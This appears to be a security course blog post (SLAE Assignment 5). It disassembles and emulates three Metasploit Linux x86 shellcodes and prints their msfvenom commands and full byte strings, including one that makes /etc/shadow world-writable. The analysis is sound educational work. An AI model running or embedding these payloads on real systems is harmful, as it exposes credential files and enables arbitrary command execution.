@@ -1,0 +1,298 @@
+<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.3.0" /><meta property="og:title" content="SLAE - Assignment 5 - Analyzing 3rd party Shellcode" /><meta name="author" content="fwinsnes" /><meta property="og:locale" content="en" /><meta name="description" content="Introduction" /><meta property="og:description" content="Introduction" /><link rel="canonical" href="https://whitecr0wz.github.io/posts/SLAE-Analyzing-Shellcode/" /><meta property="og:url" content="https://whitecr0wz.github.io/posts/SLAE-Analyzing-Shellcode/" /><meta property="og:site_name" content="Knowledge Library" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-18T05:44:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SLAE - Assignment 5 - Analyzing 3rd party Shellcode" /><meta name="twitter:site" content="@whitecr0wz" /><meta name="twitter:creator" content="@fwinsnes" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"fwinsnes"},"dateModified":"2021-01-18T05:44:00+00:00","datePublished":"2021-01-18T05:44:00+00:00","description":"Introduction","headline":"SLAE - Assignment 5 - Analyzing 3rd party Shellcode","mainEntityOfPage":{"@type":"WebPage","@id":"https://whitecr0wz.github.io/posts/SLAE-Analyzing-Shellcode/"},"url":"https://whitecr0wz.github.io/posts/SLAE-Analyzing-Shellcode/"}</script><title>SLAE - Assignment 5 - Analyzing 3rd party Shellcode | Knowledge Library</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Knowledge Library"><meta name="application-name" content="Knowledge Library"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="https://whitecr0wz.github.io/assets/img/Felipe-Winsnes.jpeg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Knowledge Library</a></div><div class="site-subtitle font-italic">Just sharing interesting tech stuff :)</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://twitter.com/whitecr0wz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SLAE - Assignment 5 - Analyzing 3rd party Shellcode</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>SLAE - Assignment 5 - Analyzing 3rd party Shellcode</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1610948640" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Jan 18, 2021 </em> </span><div class="d-flex justify-content-between"> <span> By <em> Felipe Winsnes </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2188 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><h4 id="introduction"><span class="mr-2">Introduction</span><a href="#introduction" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>These series of posts starting with the prefix “Assignment” will be created in order to fulfill the requirements of the SLAE certification.</p><p>The fifth assignment from the seven requires analyzing three <a href="https://es.wikipedia.org/wiki/Shellcode">shellcodes</a> generated by Metasploit through GDB/Ndisasm/Libemu. Furthermore, it is required to report the findings during the analysis.</p><h4 id="chmod-shellcode-shellcode-1"><span class="mr-2">Chmod Shellcode (Shellcode #1)</span><a href="#chmod-shellcode-shellcode-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The first shellcode to be analyzed will be one that supposedly chmods a file, however, it isn’t really known which one or the type of privileges that are granted. Let’s find out!</p><p>Generating the shellcode with msfvenom:</p><pre><code class="language-term">root@whitecr0wz:~# msfvenom -p linux/x86/chmod -f c 
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 36 bytes
+Final size of c file: 177 bytes
+unsigned char buf[] = 
+"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f"
+"\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd"
+"\x80\x6a\x01\x58\xcd\x80";
+root@whitecr0wz:~#
+</code></pre><h5 id="libemu"><span class="mr-2">Libemu</span><a href="#libemu" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Analyzing the shellcode with Libemu:</p><pre><code class="language-term">whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ echo -ne 
+"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80" | 
+../../../libemu/tools/sctest/sctest -vvv -Ss 10000 
+verbose = 3
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417000
+[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x1a155f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417000
+[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x1a155f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] 99                              cwd 
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417001
+[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x1a155f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] 6A0F                            push byte 0xf
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417003
+[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] 58                              pop eax
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417004
+[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x1a155f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] 52                              push edx
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417005
+[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] E8                              call 0x1
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417016
+[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x1a155f0 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] 5B                              pop ebx
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417017
+[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x0041700a
+[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] 68B6010000                      push dword 0x1b6
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x0041701c
+[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x00000000  edx=0x00000000  ebx=0x0041700a
+[emu 0x0x1a155f0 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] 59                              pop ecx
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x0041701d
+[emu 0x0x1a155f0 debug ] eax=0x0000000f  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
+[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] CD80                            int 0x80
+sys_chmod(2)
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x0041701f
+[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
+[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] 6A01                            push byte 0x1
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417021
+[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
+[emu 0x0x1a155f0 debug ] esp=0x00416fc6  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] 58                              pop eax
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417022
+[emu 0x0x1a155f0 debug ] eax=0x00000001  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
+[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] CD80                            int 0x80
+sys_exit(2)
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417024
+[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
+[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+[emu 0x0x1a155f0 debug ] 0000                            add [eax],al
+cpu error error accessing 0x00000004 not mapped
+
+stepcount 12
+[emu 0x0x1a155f0 debug ] cpu state    eip=0x00417026
+[emu 0x0x1a155f0 debug ] eax=0x00000000  ecx=0x000001b6  edx=0x00000000  ebx=0x0041700a
+[emu 0x0x1a155f0 debug ] esp=0x00416fca  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x1a155f0 debug ] Flags: 
+ERROR  chmod (
+) =  -1;
+ERROR  exit (
+     int status = 4288522;
+</code></pre><h5 id="ndisasm"><span class="mr-2">Ndisasm</span><a href="#ndisasm" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>As seen on the shown text, Libemu reports that the chmod syscall is being initialized! Let’s take a closer look to the code with ndisasm.</p><pre><code class="language-term">whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ echo -ne 
+"\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80" | ndisasm -u - 
+00000000  99                cdq
+00000001  6A0F              push byte +0xf
+00000003  58                pop eax
+00000004  52                push edx
+00000005  E80C000000        call 0x16
+0000000A  2F                das
+0000000B  657463            gs jz 0x71
+0000000E  2F                das
+0000000F  7368              jnc 0x79
+00000011  61                popa
+00000012  646F              fs outsd
+00000014  7700              ja 0x16
+00000016  5B                pop ebx
+00000017  68B6010000        push dword 0x1b6
+0000001C  59                pop ecx
+0000001D  CD80              int 0x80
+0000001F  6A01              push byte +0x1
+00000021  58                pop eax
+00000022  CD80              int 0x80
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$
+</code></pre><p>Really interesting, according to the man page of chmod, ECX should hold the privileges for the file that will be chmodded. As seen, dword “0x1b6” is being pushed into ECX, which in octal means 666! Even more so, we can see EAX performing the syscall in hex, as 0xf in decimal is actually 15, value for the chmod syscall. Regarding the file itself, let’s have a closer look with GDB.</p><h5 id="gdb"><span class="mr-2">GDB</span><a href="#gdb" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>We can easily see the value of the file being altered when the execution is parsed into EAX.</p><p>Let’s save this into a C file and compile it:</p><pre><code class="language-term">whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ gcc dissect_1.c -o dissect_1 -fno-stack-protector -z execstack -w 
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect1$ gdb -q ./dissect_1
+</code></pre><pre><code class="language-term">(gdb) break main
+Breakpoint 1 at 0x11b8
+(gdb) run
+Starting program: /home/whitecr0wz/assembly/assignments/Assignment_5/dissect1/dissect_1 
+
+Breakpoint 1, 0x004011b8 in main ()
+(gdb) disassemble
+Dump of assembler code for function main:
+   0x004011a9 &lt;+0&gt;:     lea    ecx,[esp+0x4]
+   0x004011ad &lt;+4&gt;:     and    esp,0xfffffff0
+   0x004011b0 &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]
+   0x004011b3 &lt;+10&gt;:    push   ebp
+   0x004011b4 &lt;+11&gt;:    mov    ebp,esp
+   0x004011b6 &lt;+13&gt;:    push   ebx
+   0x004011b7 &lt;+14&gt;:    push   ecx
+=&gt; 0x004011b8 &lt;+15&gt;:    sub    esp,0x10
+   0x004011bb &lt;+18&gt;:    call   0x4010b0 &lt;__x86.get_pc_thunk.bx&gt;
+   0x004011c0 &lt;+23&gt;:    add    ebx,0x2e40
+   0x004011c6 &lt;+29&gt;:    sub    esp,0xc
+   0x004011c9 &lt;+32&gt;:    lea    eax,[ebx+0x40]
+   0x004011cf &lt;+38&gt;:    push   eax
+   0x004011d0 &lt;+39&gt;:    call   0x401040 &lt;strlen@plt&gt;
+   0x004011d5 &lt;+44&gt;:    add    esp,0x10
+   0x004011d8 &lt;+47&gt;:    sub    esp,0x8
+   0x004011db &lt;+50&gt;:    push   eax
+   0x004011dc &lt;+51&gt;:    lea    eax,[ebx-0x1ff8]
+   0x004011e2 &lt;+57&gt;:    push   eax
+   0x004011e3 &lt;+58&gt;:    call   0x401030 &lt;printf@plt&gt;
+   0x004011e8 &lt;+63&gt;:    add    esp,0x10
+   0x004011eb &lt;+66&gt;:    lea    eax,[ebx+0x40]
+   0x004011f1 &lt;+72&gt;:    mov    DWORD PTR [ebp-0xc],eax
+   0x004011f4 &lt;+75&gt;:    mov    eax,DWORD PTR [ebp-0xc]
+   0x004011f7 &lt;+78&gt;:    call   eax
+   0x004011f9 &lt;+80&gt;:    mov    eax,0x0
+   0x004011fe &lt;+85&gt;:    lea    esp,[ebp-0x8]
+   0x00401201 &lt;+88&gt;:    pop    ecx
+   0x00401202 &lt;+89&gt;:    pop    ebx
+   0x00401203 &lt;+90&gt;:    pop    ebp
+   0x00401204 &lt;+91&gt;:    lea    esp,[ecx-0x4]
+   0x00401207 &lt;+94&gt;:    ret    
+End of assembler dump.
+(gdb) 
+</code></pre><p>Let’s put a breakpoint in 0x004011f7, place where the shellcode will finally be executed, loading the values that require the operation in EAX.</p><pre><code class="language-term">(gdb) break *0x004011f7
+Breakpoint 2 at 0x4011f7
+(gdb) c
+Continuing.
+Shellcode Length:  7
+
+Breakpoint 2, 0x004011f7 in main ()
+(gdb)
+</code></pre><p>If we read EAX we see something really interesting:</p><pre><code class="language-term">(gdb) x/4s $eax 
+0x404040 &lt;code&gt;:        "\231j\017XR\350\f"
+0x404048 &lt;code+8&gt;:      ""
+0x404049 &lt;code+9&gt;:      ""
+0x40404a &lt;code+10&gt;:     "/etc/shadow"
+(gdb)
+</code></pre><h4 id="conclusion-shellcode-1"><span class="mr-2">Conclusion (Shellcode #1)</span><a href="#conclusion-shellcode-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>As expected from the start, this shellcode will chmod a certain file. Nonethelss, when not specifing any sort of flag, the file chosen will always be /etc/shadow with the privileges in octal 666.</p><h4 id="exec-shellcode-shellcode-2"><span class="mr-2">Exec Shellcode (Shellcode #2)</span><a href="#exec-shellcode-shellcode-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The second shellcode to be analyzed will be one that executes a command, in this case being “/bin/id”</p><p>Generating the shellcode with msfvenom:</p><pre><code class="language-term">root@whitecr0wz:~# msfvenom -p linux/x86/exec CMD=/bin/id -f c 
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 43 bytes
+Final size of c file: 205 bytes
+unsigned char buf[] = 
+"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x63\x89\xe7\x68\x2f\x73\x68"
+"\x00\x68\x2f\x62\x69\x6e\x89\xe3\x52\xe8\x08\x00\x00\x00\x2f"
+"\x62\x69\x6e\x2f\x69\x64\x00\x57\x53\x89\xe1\xcd\x80";
+root@whitecr0wz:~# 
+</code></pre><h5 id="libemu-1"><span class="mr-2">Libemu</span><a href="#libemu-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><p>Let’s analyze this shellcode with Libemu:</p><pre><code class="language-term">whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect2$ echo -ne 
+"\x6A\x0B\x58\x99\x52\x66\x68\x2D\x63\x89\xE7\x68\x2F\x73\x68\x00\x68\x2F\x62\x69\x6E\x89\xE3\x52\xE8\x08\x00\x00\x00\x2F\x62\x69\x6E\x2F\x69\x64\x00\x57\x53\x89\xE1\xCD\x80" | 
+../../../libemu/tools/sctest/sctest -vv -Ss 10000 
+verbose = 2
+[emu 0x0x8205f0 debug ] cpu state    eip=0x00417000
+[emu 0x0x8205f0 debug ] eax=0x00000000  ecx=0x00000000  edx=0x00000000  ebx=0x00000000
+[emu 0x0x8205f0 debug ] esp=0x00416fce  ebp=0x00000000  esi=0x00000000  edi=0x00000000
+[emu 0x0x8205f0 debug ] Flags: 
+[emu 0x0x8205f0 debug ] 6A0B                            push byte 0xb
+[emu 0x0x8205f0 debug ] 58                              pop eax
+[emu 0x0x8205f0 debug ] 99                              cwd 
+[emu 0x0x8205f0 debug ] 52                              push edx
+[emu 0x0x8205f0 debug ] 66682D63                        push word 0x632d
+[emu 0x0x8205f0 debug ] 89E7                            mov edi,esp
+[emu 0x0x8205f0 debug ] 682F736800                      push dword 0x68732f
+[emu 0x0x8205f0 debug ] 682F62696E                      push dword 0x6e69622f
+[emu 0x0x8205f0 debug ] 89E3                            mov ebx,esp
+[emu 0x0x8205f0 debug ] 52                              push edx
+[emu 0x0x8205f0 debug ] E8                              call 0x1
+[emu 0x0x8205f0 debug ] 57                              push edi
+[emu 0x0x8205f0 debug ] 53                              push ebx
+[emu 0x0x8205f0 debug ] 89E1                            mov ecx,esp
+[emu 0x0x8205f0 debug ] CD80                            int 0x80
+execve
+int execve (const char *dateiname=00416fc0={/bin/sh}, const char * argv[], const char *envp[]);
+[emu 0x0x8205f0 debug ] 0000                            add [eax],al
+cpu error error accessing 0x00000004 not mapped
+
+stepcount 15
+[emu 0x0x8205f0 debug ] cpu state    eip=0x0041702d
+[emu 0x0x8205f0 debug ] eax=0x0000000b  ecx=0x00416fb0  edx=0x00000000  ebx=0x00416fc0
+[emu 0x0x8205f0 debug ] esp=0x00416fb0  ebp=0x00000000  esi=0x00000000  edi=0x00416fc8
+[emu 0x0x8205f0 debug ] Flags: 
+int execve (
+     const char * dateiname = 0x00416fc0 =&gt; 
+           = "/bin/sh";
+     const char * argv[] = [
+           = 0x00416fb0 =&gt; 
+               = 0x00416fc0 =&gt; 
+                   = "/bin/sh";
+           = 0x00416fb4 =&gt; 
+               = 0x00416fc8 =&gt; 
+                   = "-c";
+           = 0x00416fb8 =&gt; 
+               = 0x0041701d =&gt; 
+                   = "/bin/id";
+           = 0x00000000 =&gt; 
+             none;
+     ];
+     const char * envp[] = 0x00000000 =&gt; 
+         none;
+) =  0;
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect2$
+</code></pre><h4 id="conclusion-shellcode-2"><span class="mr-2">Conclusion (Shellcode #2)</span><a href="#conclusion-shellcode-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Interesting, execve is being executed. In addition with this, EBX is being given the value of /bin/sh through the <code class="language-plaintext highlighter-rouge">PUSH DWORD</code> instructions, whereas EDI is receiving the value of <code class="language-plaintext highlighter-rouge">-c</code>. Even more so, we can comprehend from this output that the following argument <code class="language-plaintext highlighter-rouge">/bin/id</code> is being called from a variable through the instruction <code class="language-plaintext highlighter-rouge">call 0x1</code>, finally pushing the order in reverse and saving the address in ECX. This just shows the real power of Libemu, capable of dissecting a complete shellcode with no issues within a simple output and even filtering those bytes which would mangle the output.</p><h4 id="read_file-shellcode-shellcode-3"><span class="mr-2">read_file Shellcode (Shellcode #3)</span><a href="#read_file-shellcode-shellcode-3" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>The second shellcode to be analyzed will be one that opens a file and reads it, in this case the one chosen being “./file”.</p><p>Generating the shellcode with msfvenom:</p><pre><code class="language-term">root@whitecr0wz:~# msfvenom -p linux/x86/read_file PATH=./file -f c 
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+Final size of c file: 311 bytes
+unsigned char buf[] = 
+"\xeb\x36\xb8\x05\x00\x00\x00\x5b\x31\xc9\xcd\x80\x89\xc3\xb8"
+"\x03\x00\x00\x00\x89\xe7\x89\xf9\xba\x00\x10\x00\x00\xcd\x80"
+"\x89\xc2\xb8\x04\x00\x00\x00\xbb\x01\x00\x00\x00\xcd\x80\xb8"
+"\x01\x00\x00\x00\xbb\x00\x00\x00\x00\xcd\x80\xe8\xc5\xff\xff"
+"\xff\x2e\x2f\x66\x69\x6c\x65\x00";
+root@whitecr0wz:~#
+</code></pre><h4 id="ndisasm-1"><span class="mr-2">Ndisasm</span><a href="#ndisasm-1" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>Let’s analyze this with Ndisasm:</p><pre><code class="language-term">whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect3$ echo -ne 
+"\xEB\x36\xB8\x05\x00\x00\x00\x5B\x31\xC9\xCD\x80\x89\xC3\xB8\x03\x00\x00\x00\x89\xE7\x89\xF9\xBA\x00\x10\x00\x00\xCD\x80\x89\xC2\xB8\x04\x00\x00\x00\xBB\x01\x00\x00\x00\xCD\x80
+\xB8\x01\x00\x00\x00\xBB\x00\x00\x00\x00\xCD\x80\xE8\xC5\xFF\xFF\xFF\x2E\x2F\x66\x69\x6C\x65" | ndisasm -u - 
+00000000  EB36              jmp short 0x38
+00000002  B805000000        mov eax,0x5
+00000007  5B                pop ebx
+00000008  31C9              xor ecx,ecx
+0000000A  CD80              int 0x80
+0000000C  89C3              mov ebx,eax
+0000000E  B803000000        mov eax,0x3
+00000013  89E7              mov edi,esp
+00000015  89F9              mov ecx,edi
+00000017  BA00100000        mov edx,0x1000
+0000001C  CD80              int 0x80
+0000001E  89C2              mov edx,eax
+00000020  B804000000        mov eax,0x4
+00000025  BB01000000        mov ebx,0x1
+0000002A  CD80              int 0x80
+0000002C  B801000000        mov eax,0x1
+00000031  BB00000000        mov ebx,0x0
+00000036  CD80              int 0x80
+00000038  E8C5FFFFFF        call 0x2
+0000003D  2E2F              cs das
+0000003F  66                o16
+00000040  69                db 0x69
+00000041  6C                insb
+00000042  65                gs
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_5/dissect3$
+</code></pre><p>Let’s go section-by-section what is going on:</p><h5 id="syscall-open"><span class="mr-2">Syscall Open</span><a href="#syscall-open" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><pre><code class="language-term">jmp short 0x38
+mov eax,0x5
+pop ebx
+xor ecx,ecx
+int 0x80
+</code></pre><p>Arguments required for open:<code class="language-plaintext highlighter-rouge">int open(const char *pathname, int flags);</code></p><p>It seems that we have come accross a JMP-CALL-POP technique! The jump will have most likely ended in a section with the file <code class="language-plaintext highlighter-rouge">./file</code> specified. Moreover, EAX was set to 0x5, which is the syscall for open. Furthermore, the value of <code class="language-plaintext highlighter-rouge">./file</code> has been popped into EBX, as it is required to satisfy the argument <code class="language-plaintext highlighter-rouge">pathname</code>. Lastly, ECX was set to zero, as the flags aren’t relevant.</p><h5 id="syscall-read"><span class="mr-2">Syscall Read</span><a href="#syscall-read" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><pre><code class="language-term">mov ebx,eax
+mov eax,0x3
+mov edi,esp
+mov ecx,edi
+mov edx,0x1000
+int 0x80
+</code></pre><p>Arguments required for read: <code class="language-plaintext highlighter-rouge">ssize_t read(int fd, void *buf, size_t count);</code></p><ul><li>The value of EAX has been saved into EBX for further referrals to the file descriptor.<li>EAX is given the value of 3, syscall of read.<li>The address of ESP is copied into EDI and from EDI to ECX, satisfying the argument <em>buf</em>, buffer where to read the file.<li>EDX is set 1000 in order to satisfy the <code class="language-plaintext highlighter-rouge">count</code> argument.</ul><h5 id="syscall-write"><span class="mr-2">Syscall Write</span><a href="#syscall-write" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h5><pre><code class="language-term">mov edx,eax
+mov eax,0x4
+mov ebx,0x1
+int 0x80
